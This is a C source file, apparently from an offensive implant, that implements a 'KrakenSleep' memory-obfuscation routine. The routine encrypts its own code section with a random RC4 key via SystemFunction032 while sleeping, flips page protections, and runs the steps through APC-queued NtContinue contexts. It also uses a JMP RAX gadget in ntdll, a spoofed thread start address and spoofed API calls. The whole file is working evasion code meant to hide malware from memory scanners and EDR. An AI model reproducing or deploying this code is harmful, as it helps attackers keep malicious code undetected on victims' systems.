#include "kraken.h"

VOID KrakenSleep(DWORD dwSleepTime) {
	DWORD dwTid = 0;

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;

	CONTEXT ctxA = { 0 };
	CONTEXT ctxB = { 0 };
	CONTEXT ctxC = { 0 };
	CONTEXT ctxD = { 0 };
	CONTEXT ctxE = { 0 };
	CONTEXT ctxEvent = { 0 };
	CONTEXT ctxEnd = { 0 };

	INSTANCE Inst = { 0 };
	InitInstance(&Inst);

	HANDLE hEvent = SPOOF(Inst.wFunction.pCreateEventW);
	BYTE bKey[16] = "AAAAAAAAAAAAAAAA";

	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
	SPOOF(Inst.wFunction.pBCryptOpenAlgorithmProvider, &hAlgorithm, BCRYPT_RNG_ALGORITHM, NULL);
	SPOOF(Inst.wFunction.pBCryptGenRandom, hAlgorithm, &bKey, 16);
	SPOOF(Inst.wFunction.pBCryptCloseAlgorithmProvider, hAlgorithm, 0);

	SECTION_INFO SecInfo = { 0 };
	TakeSectionInfo(&SecInfo);

	USTRING usKey = { 0 };
	USTRING usData = { 0 };

	usKey.Buffer = bKey;
	usKey.Length = usKey.MaximumLength = 16;

	usData.Buffer = SecInfo.pAddr;
	usData.Length = usData.MaximumLength = SecInfo.dwSize;

	// We spoof the thread start address
	HANDLE hThread = SPOOF(Inst.wFunction.pCreateThread, NULL, 65535, Inst.wFunction.pTpReleaseCleanupGroupMembers, NULL, CREATE_SUSPENDED, &dwTid);

	// We take addr of JMP RAX gadget
	PVOID pJmpRaxGadget = FindGadget(Inst.wModule.pNtdll, fnGadgetJmpRax);

	if (hThread != NULL) {
		DWORD dwOldProtect = 0;
		SPOOF(Inst.wFunction.pGetThreadContext, hThread, &ctx);

		MyMemncpy(&ctxA, &ctx, sizeof(CONTEXT));
		MyMemncpy(&ctxB, &ctx, sizeof(CONTEXT));
		MyMemncpy(&ctxC, &ctx, sizeof(CONTEXT));
		MyMemncpy(&ctxD, &ctx, sizeof(CONTEXT));
		MyMemncpy(&ctxE, &ctx, sizeof(CONTEXT));
		MyMemncpy(&ctxEvent, &ctx, sizeof(CONTEXT));
		MyMemncpy(&ctxEnd, &ctx, sizeof(CONTEXT));

		ctxA.Rip = pJmpRaxGadget;
		ctxA.Rax = Inst.wFunction.pVirtualProtect;
		ctxA.Rcx = SecInfo.pAddr;
		ctxA.Rdx = SecInfo.dwSize;
		ctxA.R8 = PAGE_READWRITE;
		ctxA.R9 = &dwOldProtect;
		*(PULONG_PTR)ctxA.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;

		ctxB.Rip = pJmpRaxGadget;
		ctxB.Rax = Inst.wFunction.pSystemFunction032;
		ctxB.Rcx = &usData;
		ctxB.Rdx = &usKey;
		*(PULONG_PTR)ctxB.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;

		ctxC.Rip = pJmpRaxGadget;
		ctxC.Rax = Inst.wFunction.pWaitForSingleObject;
		ctxC.Rcx = (HANDLE)-1;
		ctxC.Rdx = dwSleepTime;
		*(PULONG_PTR)ctxC.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;

		ctxD.Rip = pJmpRaxGadget;
		ctxD.Rax = Inst.wFunction.pSystemFunction032;
		ctxD.Rcx = &usData;
		ctxD.Rdx = &usKey;
		*(PULONG_PTR)ctxD.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;

		ctxE.Rip = pJmpRaxGadget;
		ctxE.Rax = Inst.wFunction.pVirtualProtect;
		ctxE.Rcx = SecInfo.pAddr;
		ctxE.Rdx = SecInfo.dwSize;
		ctxE.R8 = PAGE_EXECUTE_READWRITE;
		ctxE.R9 = &dwOldProtect;
		*(PULONG_PTR)ctxE.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;

		ctxEvent.Rip = pJmpRaxGadget;
		ctxEvent.Rax = Inst.wFunction.pSetEvent;
		ctxEvent.Rcx = hEvent;
		*(PULONG_PTR)ctxEvent.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;

		ctxEnd.Rip = pJmpRaxGadget;
		ctxEnd.Rax = Inst.wFunction.pRtlExitUserThread;
		ctxEnd.Rcx = 0;
		*(PULONG_PTR)ctxEnd.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;

		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxA);
		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxB);
		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxC);
		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxD);
		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxE);
		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxEvent);
		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxEnd);

		ULONG abcd = 0;
		SPOOF(Inst.wFunction.pNtAlertResumeThread, hThread, &abcd);
		((fnWaitForSingleObject)Inst.wFunction.pWaitForSingleObject)(hEvent, INFINITE);
		
		
	}
	SPOOF(Inst.wFunction.pCloseHandle, hThread);

}
